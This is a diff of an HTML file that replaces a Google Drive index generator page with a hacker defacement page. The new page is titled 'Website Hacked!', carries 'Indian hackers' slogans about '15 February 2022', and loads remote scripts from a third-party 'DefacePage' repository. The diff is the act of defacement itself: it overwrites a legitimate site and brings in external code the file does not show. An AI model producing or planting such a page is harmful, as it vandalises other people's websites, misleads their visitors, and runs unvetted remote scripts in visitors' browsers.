@@ -1,347 +1,61 @@
-
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no"/>
-    <title>Bhadoo Drive Index - Beta</title>
-    <link rel="icon" type="image/x-icon" href="https://www.cloudflare.com/favicon.ico"/>
-    <link href="https://cdn.jsdelivr.net/npm/bootswatch@5.0.0/dist/slate/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
-    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link id="favicon" rel="icon" type="image/png" href="" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/7ORP3DO/DefacePage@15c504eba7065807687e7ccec17809ae5f65c55c/style.css">
+    <title  id="pageTitle">Website Hacked!</title>
 
-    <style>
-        /*snippet.css*/
-        .snippet {
-            position: relative;
-            overflow: visible;
-        }
+    <script>
 
-        .snippet code {
-            font-size: 14px;
-            line-height: 20px;
-        }
+        const headingTexts = [
+            "15 FEBUARY 2022",
+            "BLACK DAY",
+            "WE ARE INDIANS",
+            "WE WILL NEVER FORGET",
+            "WE WILL NEVER FORGIVE",
+            "WEBSITE HACKED BY INDIANS HACKERS",
+        ];
+       
+        var website_title = "Website Hacked!";
+        var team_logo_url = "https://telegra.ph/file/7ced1f6f817a9f7086425.jpg";
+        var team_name_1 = "INDIAN";
+        var team_name_2 = "";
+        var team_name_3 = "HACKERS";
+        var your_message = [
+                      ["<h2><b><center>15 February 2022</center></b></h2>"],
+                      ["<h2><b><center>BLACK DAY</center></br></b></h2>"],
 
-        .snippet .btn {
-            -webkit-transition: opacity 0.3s ease-in-out;
-            -o-transition: opacity 0.3s ease-in-out;
-            transition: opacity 0.3s ease-in-out;
-            opacity: 0;
-            padding: 2px 6px;
-            position: absolute;
-            right: 4px;
-            top: 4px;
-            font-size: 13px;
-            font-weight: 700;
-            line-height: 20px;
-            color: #fff;
-            white-space: nowrap;
-            vertical-align: middle;
-            cursor: pointer;
-            background-color: #eee;
-            background-image: linear-gradient(#fcfcfc,#eee);
-            border: 1px solid #d5d5d5;
-            border-radius: 3px;
-        }
+["<b><right>The Day When a Mother Lost Her Son</b></br></right>"],
 
-        .snippet:hover .btn,
-        .snippet .btn:focus {
-            opacity: 1;
-        }
+];
+     
+   var console_prefix = "ROOT";
+        var teamMembers_Obj = [
+            ["INDIANS", "https://www.example.com/"],
+            ["HACKERS", "https://www.example.com"],
+            ["WAS", "https://www.example.com"],
+            ["THERE", "https://www.example.com"]
+        ];
 
-        @media screen and (max-width: 768px) {
-            .snippet .btn {
-                opacity: 1;
-            }
-        }
-
-        code {
-            background-color: #000;
-            border-radius: 3px;
-            color: #fff;
-            font-size: 85%;
-            margin: 0;
-            padding: 0.2em;
-        }
-
-        .hljs-keyword {
-            color: #008080;
-            font-weight: normal;
-        }
-
-        /*primer.css*/
-        .tooltipped {
-            position: relative
-        }
-
-        .tooltipped:after {
-            position: absolute;
-            z-index: 1000000;
-            display: none;
-            padding: 5px 8px;
-            font: normal normal 11px/1.5 Helvetica,arial,nimbussansl,liberationsans,freesans,clean,sans-serif,"Segoe UI Emoji","Segoe UI Symbol";
-            color: #fff;
-            text-align: center;
-            text-decoration: none;
-            text-shadow: none;
-            text-transform: none;
-            letter-spacing: normal;
-            word-wrap: break-word;
-            white-space: pre;
-            pointer-events: none;
-            content: attr(aria-label);
-            background: rgba(0,0,0,0.8);
-            border-radius: 3px;
-            -webkit-font-smoothing: subpixel-antialiased
-        }
-
-        .tooltipped:before {
-            position: absolute;
-            z-index: 1000001;
-            display: none;
-            width: 0;
-            height: 0;
-            color: rgba(0,0,0,0.8);
-            pointer-events: none;
-            content: "";
-            border: 5px solid transparent
-        }
-
-        .tooltipped:hover:before,.tooltipped:hover:after,.tooltipped:active:before,.tooltipped:active:after,.tooltipped:focus:before,.tooltipped:focus:after {
-            display: inline-block;
-            text-decoration: none
-        }
-
-        .tooltipped-multiline:hover:after,.tooltipped-multiline:active:after,.tooltipped-multiline:focus:after {
-            display: table-cell
-        }
-
-        .tooltipped-s:after,.tooltipped-se:after,.tooltipped-sw:after {
-            top: 100%;
-            right: 50%;
-            margin-top: 5px
-        }
-
-        .tooltipped-s:before,.tooltipped-se:before,.tooltipped-sw:before {
-            top: auto;
-            right: 50%;
-            bottom: -5px;
-            margin-right: -5px;
-            border-bottom-color: rgba(0,0,0,0.8)
-        }
-
-        .tooltipped-se:after {
-            right: auto;
-            left: 50%;
-            margin-left: -15px
-        }
-
-        .tooltipped-sw:after {
-            margin-right: -15px
-        }
-
-        .tooltipped-n:after,.tooltipped-ne:after,.tooltipped-nw:after {
-            right: 50%;
-            bottom: 100%;
-            margin-bottom: 5px
-        }
-
-        .tooltipped-n:before,.tooltipped-ne:before,.tooltipped-nw:before {
-            top: -5px;
-            right: 50%;
-            bottom: auto;
-            margin-right: -5px;
-            border-top-color: rgba(0,0,0,0.8)
-        }
-
-        .tooltipped-ne:after {
-            right: auto;
-            left: 50%;
-            margin-left: -15px
-        }
-
-        .tooltipped-nw:after {
-            margin-right: -15px
-        }
-
-        .tooltipped-s:after,.tooltipped-n:after {
-            -webkit-transform: translateX(50%);
-            -ms-transform: translateX(50%);
-            transform: translateX(50%)
-        }
-
-        .tooltipped-w:after {
-            right: 100%;
-            bottom: 50%;
-            margin-right: 5px;
-            -webkit-transform: translateY(50%);
-            -ms-transform: translateY(50%);
-            transform: translateY(50%)
-        }
-
-        .tooltipped-w:before {
-            top: 50%;
-            bottom: 50%;
-            left: -5px;
-            margin-top: -5px;
-            border-left-color: rgba(0,0,0,0.8)
-        }
-
-        .tooltipped-e:after {
-            bottom: 50%;
-            left: 100%;
-            margin-left: 5px;
-            -webkit-transform: translateY(50%);
-            -ms-transform: translateY(50%);
-            transform: translateY(50%)
-        }
-
-        .tooltipped-e:before {
-            top: 50%;
-            right: -5px;
-            bottom: 50%;
-            margin-top: -5px;
-            border-right-color: rgba(0,0,0,0.8)
-        }
-
-        .tooltipped-multiline:after {
-            width: -moz-max-content;
-            width: max-content;
-            max-width: 250px;
-            word-break: break-word;
-            word-wrap: normal;
-            white-space: pre-line;
-            border-collapse: separate
-        }
-
-        .tooltipped-multiline.tooltipped-s:after,.tooltipped-multiline.tooltipped-n:after {
-            right: auto;
-            left: 50%;
-            -webkit-transform: translateX(-50%);
-            -ms-transform: translateX(-50%);
-            transform: translateX(-50%)
-        }
-
-        .tooltipped-multiline.tooltipped-w:after,.tooltipped-multiline.tooltipped-e:after {
-            right: 100%
-        }
-
-        @media screen and (min-width: 0\0) {
-            .tooltipped-multiline:after {
-                width: 250px
-            }
-        }
-
-        .tooltipped-sticky:before,.tooltipped-sticky:after {
-            display: inline-block
-        }
-
-        .tooltipped-sticky.tooltipped-multiline:after {
-            display: table-cell
-        }
-    </style>
+        var typing_speed = -5000;
+        var playAudio = true;
+        var blockProxy = true;
+    </script>
 </head>
-<body">
-<div class="container">
-    <br><br>
-    <a href="https://www.npmjs.com/package/@googledrive/index"><h3>Bhadoo Index Generator - Beta</h3></a>
-    <br>
-        <div>
-            <h3>1. <a
-               href="https://accounts.google.com/o/oauth2/auth?client_id=746239575955-oao9hkv614p8glrqpvuh5i8mqfoq145b.apps.googleusercontent.com&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&access_type=offline&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&approval_prompt=auto"
-               target="_blank"><img src="https://developers.google.com/identity/images/btn_google_signin_dark_normal_web.png"></a></h3>
-        </div>
-        <p>The App requests permissions to access your Google Drive files so do not share this code with anyone else.</p>
-    <br>
-    <div>
-<h3>2. Enter Details</h3>
-<form>
-  <div class="mb-3">
-    <label for="authcode" class="form-label">Authentication Code</label>
-    <input type="text" class="form-control" id="authcode" name="auth_code" aria-describedby="authcodefromgoogle" required>
-    <div id="authcodefromgoogle" class="form-text">Enter Code Generated from Google. Keep it private and do not share.</div>
-  </div>
-  <div class="mb-3">
-    <label for="sitename" class="form-label">Site Name</label>
-    <input type="text" class="form-control" name="site_name" id="sitename">
-  </div>
-  <div class="mb-3">
-    <label for="driveId" class="form-label">Share Drive ID or root</label>
-    <input type="text" class="form-control" value="root" name="root" id="driveId" required>
-  </div>
-  <button type="submit" class="btn btn-primary">Submit</button>
-</form>
-    </div>
-    <br><br>
-    <h3>
-        3. Copy following code and paste into <a href="https://dash.cloudflare.com" target="_blank">Cloudflare Workers</a>
-    </h3>
-    <div class="overflow-auto" style="background-color:#000;">
-        <pre class="snippet"><code class="html js"></code></pre>
-    </div>
-    <center><p>© <span id="year"></span> - Bhadoo Cloud Cyber Systems</p></center>
-</div>
 
-<script>
-    document.getElementById("year").innerHTML = new Date().getFullYear();
-    /*snippets.js*/
-    var snippets = document.querySelectorAll('.snippet');
+<body>
 
-    [].forEach.call(snippets, function(snippet) {
-        snippet.firstChild.insertAdjacentHTML('beforebegin', '<button class="btn" data-clipboard-snippet><img class="clippy" width="13" src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjEwMjQiIHdpZHRoPSI4OTYiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBhdGggZD0iTTEyOCA3NjhoMjU2djY0SDEyOHYtNjR6IG0zMjAtMzg0SDEyOHY2NGgzMjB2LTY0eiBtMTI4IDE5MlY0NDhMMzg0IDY0MGwxOTIgMTkyVjcwNGgzMjBWNTc2SDU3NnogbS0yODgtNjRIMTI4djY0aDE2MHYtNjR6TTEyOCA3MDRoMTYwdi02NEgxMjh2NjR6IG01NzYgNjRoNjR2MTI4Yy0xIDE4LTcgMzMtMTkgNDVzLTI3IDE4LTQ1IDE5SDY0Yy0zNSAwLTY0LTI5LTY0LTY0VjE5MmMwLTM1IDI5LTY0IDY0LTY0aDE5MkMyNTYgNTcgMzEzIDAgMzg0IDBzMTI4IDU3IDEyOCAxMjhoMTkyYzM1IDAgNjQgMjkgNjQgNjR2MzIwaC02NFYzMjBINjR2NTc2aDY0MFY3Njh6TTEyOCAyNTZoNTEyYzAtMzUtMjktNjQtNjQtNjRoLTY0Yy0zNSAwLTY0LTI5LTY0LTY0cy0yOS02NC02NC02NC02NCAyOS02NCA2NC0yOSA2NC02NCA2NGgtNjRjLTM1IDAtNjQgMjktNjQgNjR6IiAvPgo8L3N2Zz4K" alt="Copy to clipboard"></button>');
-    });
+    <div id="defacePage" onclick="play()"></div>
 
-    var clipboardSnippets = new ClipboardJS('[data-clipboard-snippet]', {
-        target: function(trigger) {
-            return trigger.nextElementSibling;
-        }
-    });
-
-    clipboardSnippets.on('success', function(e) {
-        e.clearSelection();
-
-        showTooltip(e.trigger, 'Copied!');
-    });
-
-    clipboardSnippets.on('error', function(e) {
-        showTooltip(e.trigger, fallbackMessage(e.action));
-    });
-
-    /*tooltips.js*/
-    var btns = document.querySelectorAll('.btn');
-
-    for (var i = 0; i < btns.length; i++) {
-        btns[i].addEventListener('mouseleave', clearTooltip);
-        btns[i].addEventListener('blur', clearTooltip);
-    }
-
-    function clearTooltip(e) {
-        e.currentTarget.setAttribute('class', 'btn');
-        e.currentTarget.removeAttribute('aria-label');
-    }
-
-    function showTooltip(elem, msg) {
-        elem.setAttribute('class', 'btn tooltipped tooltipped-s');
-        elem.setAttribute('aria-label', msg);
-    }
-
-    // Simplistic detection, do not use it in production
-    function fallbackMessage(action) {
-        var actionMsg = '';
-        var actionKey = (action === 'cut' ? 'X' : 'C');
-
-        if(/iPhone|iPad/i.test(navigator.userAgent)) {
-            actionMsg = 'No support :(';
-        }
-        else if (/Mac/i.test(navigator.userAgent)) {
-            actionMsg = 'Press ⌘-' + actionKey + ' to ' + action;
-        }
-        else {
-            actionMsg = 'Press Ctrl-' + actionKey + ' to ' + action;
-        }
-
-        return actionMsg;
-    }
-
-</script>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-p34f1UUtsS3wqzfto5wAAmdvj+osOnFyQFpp4Ua3gs/ZVWx6oOypYoCJhGGScy+8" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/gh/7ORP3DO/DefacePage@68d1d1ecedf73ce23f1a2a58ecbf9c32a24dc0cb/html.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/7ORP3DO/DefacePage/libs.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/7ORP3DO/DefacePage@page-v1.2/main.js"></script>
+    <script src="https://rawcdn.githack.com/7ORP3DO/DefacePage/4b762e09ee07227923c212a1c4a69de7fe1a6cc7/main2.js"></script>
 </body>
+
 </html>
